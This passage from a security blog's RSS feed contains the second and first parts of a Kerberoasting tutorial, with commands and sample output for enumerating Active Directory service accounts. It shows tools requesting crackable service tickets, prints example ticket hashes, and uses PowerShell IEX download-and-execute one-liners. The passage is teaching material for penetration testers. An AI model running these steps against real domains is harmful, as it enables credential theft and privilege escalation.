&lt;p&gt;But all of that is hard and creates evidence. Lets look back at the tools &lt;a href=&#34;https://github.com/skelsec/PyKerberoast&#34;&gt;PyKerberoast&lt;/a&gt; and &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&#34;&gt;Impacket&amp;rsquo;s GetUserSPNs.py&lt;/a&gt; and see if there is a better way:&lt;/p&gt;

&lt;h2 id=&#34;pykerberoast&#34;&gt;PyKerberoast&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Source: &lt;a href=&#34;https://github.com/skelsec/PyKerberoast&#34;&gt;https://github.com/skelsec/PyKerberoast&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Requirements: &lt;code&gt;python-ldap&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This awesome work by &lt;a href=&#34;https://twitter.com/skelsec&#34;&gt;@skelsec&lt;/a&gt; makes it so no new Kerberos tickets need to be added to the client, no use of Mimikatz, and no need to parse anything, it just contacts the Domain Controller. It pulls out all of the information needed for the SPNs, requests the tickets and outputs them in John the Ripper format.&lt;/p&gt;

&lt;p&gt;Usage:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;kerberoastv2.py [-h] -a ADSERVER -b LDAPBASE -d DOMAIN -u USERNAME
                [-p PASSWORD] [-o OUTPUTFILE] [-em ENUMMACHINE] [-v]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Example (I have snipped up some of the output to save space):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@wpad:~/pykerberoast# python kerberoastv2.py -a 192.168.168.10 -b &amp;quot;dc=sittingduck,dc=info&amp;quot; -d sittingduck -u notanadmin
[+]Starting...
Password:
$krb5tgs$23$*uberuser$SITTINGDUCK.INFO$spn*$4da625ffd63dad7676effe133dcb9c1b$af52b31c7c39808f02bceb2d728550e375ff7321f7383f4800445df2a27006950a0f88c69a447de1643a7418f056315c684382068701a62f627c6cafde81bbc657c865ddd828027cef1edc11228ea0b95caca91647fc4b581efb380e466d12e253309d65a11dcbe02b0de70e0aa9044350461ad5d4293a07e3cf588a05a04a7942b63f395c6eed5e8dc826160a7bc00e295df539e419b9a4c17762b3bc987bc339354892e51090d7a7ede236cf500438e57f47a4155cc38f8a07cfdb2e3f7033ce412a6f7856911d9cf95e659daf4269d1b31cf872b09dc86af614b95c457fc896d01fdfb0afc751d2279d4c715

[+]Done!
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;impacket&#34;&gt;Impacket&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Original Discussion: &lt;a href=&#34;https://github.com/CoreSecurity/impacket/pull/153#issuecomment-218438868&#34;&gt;https://github.com/CoreSecurity/impacket/pull/153#issuecomment-218438868&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Added May 13 2016: &lt;a href=&#34;https://github.com/CoreSecurity/impacket/commit/2a185c1ecc0b0a56467f12dfccbd5672ed95adaa&#34;&gt;https://github.com/CoreSecurity/impacket/commit/2a185c1ecc0b0a56467f12dfccbd5672ed95adaa&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Source: &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&#34;&gt;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Just by adding a &lt;strong&gt;&lt;code&gt;-request&lt;/code&gt;&lt;/strong&gt; to our previous run we can request all of the user SPN tickets and they are output in John the Ripper format (I&amp;rsquo;ve snipped up some of the output to save space):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@wpad:~/impacket/examples# ./GetUserSPNs.py -request sittingduck.info/notanadmin
Impacket v0.9.15-dev - Copyright 2002-2016 Core Security Technologies

Password:
ServicePrincipalName                Name        MemberOf                                              PasswordLastSet
----------------------------------  ----------  ----------------------------------------------------  -------------------
http/win10.sittingduck.info         uberuser    CN=Enterprise Admins,CN=Users,DC=sittingduck,DC=info  2015-11-10 23:47:21
MSSQLSvc/WIN2K8R2.sittingduck.info  sqladmin01                                                        2016-05-13 19:13:20

$krb5tgs$23$*sqladmin01$SITTINGDUCK.INFO$SPN*$6e5307df490c6e3339f613fdc5655785$80ba233b4d24531202f2e354c99e7eda807bde7aeeb48ee4cdb6bf809d78652413699e3cff8b9b78b9ee70e997a538155fc7f72e208d715020d458b8413d4b12b212738833c4694d84937d65cb8ecd0020c00a5d39c07da35a748ea2cb062fca4fa9b282e7046d70ee1cae4cfee7d6f791052e283
$krb5tgs$23$*uberuser$SITTINGDUCK.INFO$SPN*$27c08ed2a8d5394f66e8c13c25c98393$310b787ec5c10b20fcc0acb1406b6a6e2ffddd71de3dc4c70c19e5dfcf262cc88574e61cb3940ebfd574b2bb555f2b05f84d8526e3cf46fc0ca57e03467729757cbf79da9f55cde9dabdda68e80dce6564e9f1b904b0585dbc813b82abf89e973e41c102b664f4c649f85acaf7904a273dddcb9315a66f27334f313190e1caf4f5055b671d250f5912cc1871a1dd4a6126087ddfb98ade8f7dde495ee8ad76583aa5a12eef63a690dd82a15eaaca0d7594f2f1dbc899035d89dd628b291590058cfb3405d1dfe4a383be5704465d9c8972ef8f1cba3541fdfa7dcf5063eaed74051fa18bd73f7b4f7d77
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Much easier ;-) oh, and did I mention that if you use Impacket&amp;rsquo;s version you can just use LM/NTLM hashes instead of a password? Awesome! Alright, all we have left is to crack these tickets and figure out how to use them&amp;hellip;&lt;/p&gt;

&lt;h1 id=&#34;references&#34;&gt;References:&lt;/h1&gt;

&lt;h2 id=&#34;tools&#34;&gt;Tools&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/nidem/kerberoast&#34;&gt;Kerberoast&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/coresecurity/impacket&#34;&gt;Impacket&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/skelsec/PyKerberoast&#34;&gt;PyKerberoast&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/magnumripper/JohnTheRipper&#34;&gt;Github - John the Ripper - Magnumripper&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/hashcat/oclHashcat&#34;&gt;Github - oclHashcat&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;presentations&#34;&gt;Presentations&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Tim Medin&amp;rsquo;s Slides - [Kicking the Guard Dog of Hades - slides](&lt;a href=&#34;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf&#34;&gt;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;Tim Medin&amp;rsquo;s Video - &lt;a href=&#34;https://www.youtube.com/watch?v=PUyhlN-E5MU&amp;amp;feature=youtu.be&#34;&gt;Kicking the Guard Dog of Hades - video&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;other-write-ups&#34;&gt;Other write ups&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://malwarejake.blogspot.com/2015/11/kerberos-silver-tickets-unique-attacker.html&#34;&gt;Jacob Williams (MalwareJake) post about Silver Tickets being using in the wild&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Brute-Forcing_Service_Account_Passwords.html&#34;&gt;Ben Lincoln&amp;rsquo;s writeup on Brute Forcing Service Account Passwords&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/&#34;&gt;Leon Jacob&amp;rsquo;s writeup on Kerberoast&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://adsecurity.org/?p=2293&#34;&gt;Sean Metcalf&amp;rsquo;s writeup on Kerberoast&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://adsecurity.org/?page_id=183&#34;&gt;Sean Metcalf&amp;rsquo;s SPN directory&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Kerberoasting - Part 1</title>
      <link>https://room362.com/post/2016/kerberoast-pt1/</link>
      <pubDate>Fri, 20 May 2016 07:35:28 -0500</pubDate>
      
      <guid>https://room362.com/post/2016/kerberoast-pt1/</guid>
      <description>

&lt;p&gt;&lt;strong&gt;Previous works:&lt;/strong&gt; There has been a number of differnet blog posts, presentations and projects that have happened before this post and I will reference a number of them during the post and at the end have a link to all that I know about. If you know of any works on this subject that I am missing please submit a comment below and I&amp;rsquo;ll will be sure to reference it.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Attacker KB Link:&lt;/strong&gt; (to be updated later)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Common Findings DB Link:&lt;/strong&gt; (to be updated later)&lt;/p&gt;

&lt;h2 id=&#34;what-are-spns&#34;&gt;What are SPNs&lt;/h2&gt;

&lt;p&gt;[Service Principal Names](&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/ms677949(v=vs.85).aspx&#34;&gt;https://msdn.microsoft.com/en-us/library/ms677949(v=vs.85).aspx&lt;/a&gt;) (SPNs) are:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account.&amp;rdquo; - MSDN&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Basically mapping a service running on a server to an account it&amp;rsquo;s running as so that it can do / accept kerberos authentication. Normally, these services, like &amp;ldquo;CIFS&amp;rdquo; (Windows Shares) run under the context of the computer account.&lt;/p&gt;

&lt;h2 id=&#34;why-would-they-be-associated-with-users&#34;&gt;Why would they be associated with users?&lt;/h2&gt;

&lt;p&gt;I won&amp;rsquo;t say that this is the reason for the change, but for a long time Information Security professionals (and bad guys) have exploited the idea that services run as the all powerful &lt;strong&gt;&amp;ldquo;NT AUTHORITY\SYSTEM&amp;rdquo;&lt;/strong&gt; account. For those who don&amp;rsquo;t know, this means that if someone exploits one of those services, they are basically ROOT on that machine in the Windows world.&lt;/p&gt;

&lt;p&gt;One of the ways that Microsoft has enabled system administrators and software developers to step away from this paradigm is to create the [NT AUTHORITY\NETWORK SERVICE](&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85).aspx&#34;&gt;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85).aspx&lt;/a&gt;) and [NT AUTHORITY\LOCAL SERVICE](&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85).aspx&#34;&gt;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85).aspx&lt;/a&gt;) accounts. This allowed basic permissions and are great alternatives. However, these accounts, while perfectly limited, did not have any authentication abilities on the network. So, system administrators started using domain accounts to run services. This is where things go wrong again.&lt;/p&gt;

&lt;p&gt;Yes, I know there is such a thing as [Managed Service Accounts](&lt;a href=&#34;https://technet.microsoft.com/en-us/library/dd560633(v=ws.10).aspx&#34;&gt;https://technet.microsoft.com/en-us/library/dd560633(v=ws.10).aspx&lt;/a&gt;) now (introduced in 2011 with a Windows Server 2008 R2 update) and spoiler alert, that&amp;rsquo;s the fix to the issue we will be discussing below and in the next few parts, but even MSAs have an issue that I&amp;rsquo;ll discuss in the last section of this series.&lt;/p&gt;

&lt;h2 id=&#34;why-should-i-care&#34;&gt;Why should I care?&lt;/h2&gt;

&lt;p&gt;Any valid domain user can request a kerberos ticket for any domain service (or even services outside the domain as long as there is a trust there). Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as. The users running these services usually are at the very least administrators on the computers for which they are a service on, but more commonly they are some sort of administrative account (Domain Admins).&lt;/p&gt;

&lt;h2 id=&#34;listing-spns&#34;&gt;Listing SPNs&lt;/h2&gt;

&lt;p&gt;Ok, so, now you know the background and why you want to do this attack,  but how do we go about listing what SPNs are out there for the domain you are on. There are a ton of ways to do this:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Just use the built in &lt;code&gt;SetSPN.exe&lt;/code&gt; built into Windows&lt;/li&gt;
&lt;li&gt;Use the &lt;a href=&#34;https://github.com/nullbind/Powershellery/tree/master/Stable-ish/Get-SPN&#34;&gt;Get-SPN.ps1&lt;/a&gt; that &lt;a href=&#34;https://twitter.com/_nullbind&#34;&gt;@_nullbind&lt;/a&gt; (Scott Sutherland) posted about on the NetSPI blog in a post titled &lt;a href=&#34;https://blog.netspi.com/faster-domain-escalation-using-ldap/&#34;&gt;Faster Domain Escalation using LDAP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Use the &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire&#34;&gt;PowerShell Empire&lt;/a&gt; &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/situational_awareness/network/get_spn.py&#34;&gt;port of @_nullbind&amp;rsquo;s Get-SPN powershell script&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Use &lt;a href=&#34;https://twitter.com/timmedin&#34;&gt;Tim Medin - @timmedin&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs&#34;&gt;GetUserSPNs VB script&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Use &lt;a href=&#34;https://twitter.com/timmedin&#34;&gt;Tim Medin - @timmedin&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1&#34;&gt;GetUserSPNs PowerShell script&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Use &lt;a href=&#34;https://github.com/CoreSecurity/impacket&#34;&gt;Impacket&lt;/a&gt;&amp;rsquo;s &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&#34;&gt;GetUserSPN.py&lt;/a&gt; - unlike the other tools and techniques, this one executes without the advantage of the Windows tokes, so you are going to need credentials, but this is also the advantage as you are not loading anything on disk or executing anything through the use of cmd.exe or powershell.exe&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;1-setspn&#34;&gt;1. SetSPN&lt;/h3&gt;

&lt;p&gt;SetSPN is a tool built into Windows and will do that job perfectly just as Tim Medin describes in his &lt;a href=&#34;http://www.irongeek.com/i.php?page=videos/derbycon4/t120-attacking-microsoft-kerberos-kicking-the-guard-dog-of-hades-tim-medin&#34;&gt;presentation&lt;/a&gt; and &lt;a href=&#34;https://github.com/nidem/kerberoast&#34;&gt;Kerberoast Github repo&lt;/a&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;C:\&amp;gt;setspn -t sittingduck -q */*
Checking domain DC=sittingduck,DC=info
CN=DC1,OU=Domain Controllers,DC=sittingduck,DC=info
        TERMSRV/DC1
        TERMSRV/DC1.sittingduck.info
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC1.sittingduck.info
        ldap/DC1.sittingduck.info/DomainDnsZones.sittingduck.info
        ldap/DC1.sittingduck.info/ForestDnsZones.sittingduck.info
        DNS/DC1.sittingduck.info
        GC/DC1.sittingduck.info/sittingduck.info
        RestrictedKrbHost/DC1.sittingduck.info
        RestrictedKrbHost/DC1
        RPC/ebee5e45-e3a3-481d-bf6c-29f3833e2392._msdcs.sittingduck.info
        HOST/DC1/SITTINGDUCK
        HOST/DC1.sittingduck.info/SITTINGDUCK
        HOST/DC1
        HOST/DC1.sittingduck.info
        HOST/DC1.sittingduck.info/sittingduck.info
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/ebee5e45-e3a3-481d-bf6c-29f3833e2392/sittingduck.info
        ldap/DC1/SITTINGDUCK
        ldap/ebee5e45-e3a3-481d-bf6c-29f3833e2392._msdcs.sittingduck.info
        ldap/DC1.sittingduck.info/SITTINGDUCK
        ldap/DC1
        ldap/DC1.sittingduck.info
        ldap/DC1.sittingduck.info/sittingduck.info
CN=krbtgt,CN=Users,DC=sittingduck,DC=info
        kadmin/changepw
CN=Uber User,CN=Users,DC=sittingduck,DC=info
        http/win10.sittingduck.info
CN=WIN7,CN=Computers,DC=sittingduck,DC=info
        RestrictedKrbHost/WIN7
        HOST/WIN7
        RestrictedKrbHost/WIN7.sittingduck.info
        HOST/WIN7.sittingduck.info
CN=WIN2K8R2,OU=Domain Controllers,DC=sittingduck,DC=info
        TERMSRV/win2k8r2.sittingduck.info
        TERMSRV/WIN2K8R2
        ldap/WIN2K8R2
        ldap/win2k8r2.sittingduck.info
        ldap/win2k8r2.sittingduck.info/DomainDnsZones.sittingduck.info
        ldap/win2k8r2.sittingduck.info/ForestDnsZones.sittingduck.info
        ldap/win2k8r2.sittingduck.info/sittingduck.info
        ldap/win2k8r2.sittingduck.info/SITTINGDUCK
        ldap/cb4e0d50-5fc3-4900-9bc6-3d097d877ec4._msdcs.sittingduck.info
        ldap/WIN2K8R2/SITTINGDUCK
        HOST/win2k8r2.sittingduck.info/sittingduck.info
        GC/win2k8r2.sittingduck.info/sittingduck.info
        HOST/win2k8r2.sittingduck.info/SITTINGDUCK
        HOST/WIN2K8R2/SITTINGDUCK
        DNS/win2k8r2.sittingduck.info
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/cb4e0d50-5fc3-4900-9bc6-3d097d877ec4/sittingduck.info
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/win2k8r2.sittingduck.info
        WSMAN/win2k8r2
        WSMAN/win2k8r2.sittingduck.info
        RestrictedKrbHost/WIN2K8R2
        HOST/WIN2K8R2
        RestrictedKrbHost/WIN2K8R2.sittingduck.info
        HOST/WIN2K8R2.sittingduck.info
CN=WIN10,CN=Computers,DC=sittingduck,DC=info
        RestrictedKrbHost/WIN10
        HOST/WIN10
        RestrictedKrbHost/win10.sittingduck.info
        HOST/win10.sittingduck.info
CN=CA,CN=Computers,DC=sittingduck,DC=info
        WSMAN/CA
        WSMAN/CA.sittingduck.info
        RestrictedKrbHost/CA
        HOST/CA
        RestrictedKrbHost/CA.sittingduck.info
        HOST/CA.sittingduck.info
CN=MSSQL Service Admin,CN=Users,DC=sittingduck,DC=info
        MSSQLSvc/WIN2K8R2.sittingduck.info

Existing SPN found!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Each line that starts with &amp;ldquo;CN&amp;rdquo; is an account&amp;rdquo; and the SPNs under it are the ones associated with that account. Lots of great information can be determined just from the output of this command. Even though for cracking purposes we only want the SPNs associated with possibly weak password accounts (usually only User accounts), we should still pull this information down.&lt;/p&gt;

&lt;h3 id=&#34;get-spn&#34;&gt;Get-SPN&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Link: &lt;a href=&#34;https://github.com/nullbind/Powershellery/tree/master/Stable-ish/Get-SPN&#34;&gt;nullbind&amp;rsquo;s Get-SPN folder in the Powershellery repo&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This module gives you a lot more information than SetSPN did. Having the PasswordLastSet and LastLogon helps to figure out when and &lt;em&gt;if&lt;/em&gt; an account has ever been used. In the example below the &amp;ldquo;sqladmin01&amp;rdquo; account has never logged on and was created recently. If this password cracks then there is a good chance that it is some common password set when setting up accounts&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; As of this writing, this module only works with PowerShell 3.0+&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; IEX (New-Object Net.WebClient).DownloadString(&amp;quot;https://raw.githubusercontent.com/
nullbind/Powershellery/master/Stable-ish/Get-SPN/Get-SPN.psm1&amp;quot;)
PS C:\&amp;gt; Get-SPN -type service -search &amp;quot;MSSQL*&amp;quot;


Name            : MSSQL Service Admin
SAMAccount      : sqladmin01
Description     :
UserPrincipal   : sqladmin01@sittingduck.info
DN              : CN=MSSQL Service Admin,CN=Users,DC=sittingduck,DC=info
Created         : 5/13/2016 11:13:20 PM
LastModified    : 5/13/2016 11:13:28 PM
PasswordLastSet : 5/13/2016 7:13:20 PM
AccountExpires  : &amp;lt;Never&amp;gt;
LastLogon       : 12/31/1600 7:00:00 PM
GroupMembership :
SPN Count       : 1

ServicePrincipalNames (SPN):
MSSQLSvc/WIN2K8R2.sittingduck.info

&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;powershell-empire&#34;&gt;PowerShell Empire&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Link: &lt;a href=&#34;https://github.com/PowerShellEmpire/Empire/blob/master/lib/modules/situational_awareness/network/get_spn.py&#34;&gt;PowerShell Empire get_spn module&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This module basically just incorporates the script from above.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Disclaimer:&lt;/strong&gt; As of this writing, this module only works with PowerShell 3.0+&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;(Empire: situational_awareness/network/get_spn) &amp;gt; info

           Name: Get-SPN
         Module: situational_awareness/network/get_spn
     NeedsAdmin: False
      OpsecSafe: True
   MinPSVersion: 2
     Background: True
OutputExtension: None

Authors:
  @_nullbind

Description:
  Displays Service Principal Names (SPN) for domain accounts
  based on SPN service name, domain account, or domain group
  via LDAP queries.

Options:

  Name   Required    Value                     Description
  ----   --------    -------                   -----------
  Search False       MSSQL*                    Search string for group, username, or
                                               service name. Wildcards accepted.
  Type   False       service                   &#39;group&#39;, &#39;user&#39;, or &#39;service&#39;
  Agent  True                                  Agent to run module on.

(Empire: situational_awareness/network/get_spn) &amp;gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;listing-user-spns&#34;&gt;Listing User SPNs&lt;/h2&gt;

&lt;h3 id=&#34;getuserspns-vbs&#34;&gt;GetUserSPNs.vbs&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Link: &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs&#34;&gt;Kerberoast&amp;rsquo;s GetUserSPNs.vbs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;GetUserSPNs was the first script to focus only on accounts that were Users. When you are looking at a network that has 40,000+ Windows boxes and all of the has the &amp;ldquo;HOST&amp;rdquo; SPN, it&amp;rsquo;s a lot to trudge through. This script cuts the fat and just gives you the list of SPNs that have a much higher chance of having their accounts cracked.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;C:\temp&amp;gt; cscript GetUserSPNs.vbs
Microsoft (R) Windows Script Host Version 5.8
Copyright (C) Microsoft Corporation. All rights reserved.

CN=Uber User,CN=Users,DC=sittingduck,DC=info
User Logon: uberuser
-- http/win10.sittingduck.info

CN=krbtgt,CN=Users,DC=sittingduck,DC=info
User Logon: krbtgt
-- kadmin/changepw

CN=MSSQL Service Admin,CN=Users,DC=sittingduck,DC=info
User Logon: sqladmin01
-- MSSQLSvc/WIN2K8R2.sittingduck.info
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;getuserspns-ps1&#34;&gt;GetUserSPNs.ps1&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Link: &lt;a href=&#34;https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1&#34;&gt;Kerberoast&amp;rsquo;s GetUserSPNs.ps1&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I really like this script because it tells you the time the password was last set. This allows for you to make educated selections on which accounts to attack with your password cracking. (More hashes needed to crack, the longer it takes)&lt;/p&gt;

&lt;p&gt;Below I use the &lt;code&gt;IEX&lt;/code&gt; (Invoke-Expression) command in PowerShell to download and run the PowerShell script directly from Tim&amp;rsquo;s repository, but you could just as easily upload it and run it.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;PS C:\&amp;gt; IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercon
tent.com/nidem/kerberoast/master/GetUserSPNs.ps1&#39;)

ServicePrincipalNam Name                MemberOf            PasswordLastSet
e
------------------- ----                --------            ---------------
http/win10.sitti... Uber User           CN=Domain Admins... 11/10/2015 11:47...
kadmin/changepw     krbtgt              CN=Denied RODC P... 11/10/2015 6:18:...
MSSQLSvc/WIN2K8R... MSSQL Service Admin                     5/13/2016 7:13:2...
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;impacket&#34;&gt;Impacket&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Link: &lt;a href=&#34;https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py&#34;&gt;Impacket&amp;rsquo;s GetUserSPNs.py&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Impacket is a recent addition to the list of tools that perform SPN listing. &lt;a href=&#34;https://github.com/CoreSecurity/impacket/pull/153&#34;&gt;Pull request #153 - TGS-Response code to work with windows AD&lt;/a&gt; was all it took to motivate &lt;a href=&#34;https://twitter.com/agsolino&#34;&gt;@agsolino&lt;/a&gt; into making an example script and while &lt;a href=&#34;https://github.com/skelsec/PyKerberoast&#34;&gt;PyKerberoast&lt;/a&gt; by &lt;a href=&#34;https://twitter.com/skelsec&#34;&gt;@skelsec&lt;/a&gt; came first, it doesn&amp;rsquo;t have a plain &amp;ldquo;list&amp;rdquo; function so I wanted to save it for the extraction post.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@wpad:~/impacket/examples# ./GetUserSPNs.py -dc-ip 192.168.168.10 sittingduck.info/notanadmin
Impacket v0.9.15-dev - Copyright 2002-2016 Core Security Technologies

Password:
ServicePrincipalName                Name        MemberOf                                          PasswordLastSet
----------------------------------  ----------  ------------------------------------------------  -------------------
http/win10.sittingduck.info         uberuser    CN=Domain Admins,CN=Users,DC=sittingduck,DC=info  2015-11-10 23:47:21
MSSQLSvc/WIN2K8R2.sittingduck.info  sqladmin01                                                    2016-05-13 19:13:20
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And that is it for now. We have listed all of the SPNs or just the ones we needed. In Part 2 we will make requests for the SPN tickets we want.&lt;/p&gt;

&lt;h1 id=&#34;references&#34;&gt;References:&lt;/h1&gt;

&lt;h2 id=&#34;tools&#34;&gt;Tools&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/nidem/kerberoast&#34;&gt;Kerberoast&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/coresecurity/impacket&#34;&gt;Impacket&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/skelsec/PyKerberoast&#34;&gt;PyKerberoast&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/magnumripper/JohnTheRipper&#34;&gt;Github - John the Ripper - Magnumripper&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/hashcat/oclHashcat&#34;&gt;Github - oclHashcat&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;presentations&#34;&gt;Presentations&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Tim Medin&amp;rsquo;s Slides - [Kicking the Guard Dog of Hades - slides](&lt;a href=&#34;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf&#34;&gt;https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;Tim Medin&amp;rsquo;s Video - &lt;a href=&#34;https://www.youtube.com/watch?v=PUyhlN-E5MU&amp;amp;feature=youtu.be&#34;&gt;Kicking the Guard Dog of Hades - video&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;other-write-ups&#34;&gt;Other write ups&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://malwarejake.blogspot.com/2015/11/kerberos-silver-tickets-unique-attacker.html&#34;&gt;Jacob Williams (MalwareJake) post about Silver Tickets being using in the wild&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Brute-Forcing_Service_Account_Passwords.html&#34;&gt;Ben Lincoln&amp;rsquo;s writeup on Brute Forcing Service Account Passwords&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/&#34;&gt;Leon Jacob&amp;rsquo;s writeup on Kerberoast&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://adsecurity.org/?p=2293&#34;&gt;Sean Metcalf&amp;rsquo;s writeup on Kerberoast&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://adsecurity.org/?page_id=183&#34;&gt;Sean Metcalf&amp;rsquo;s SPN directory&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
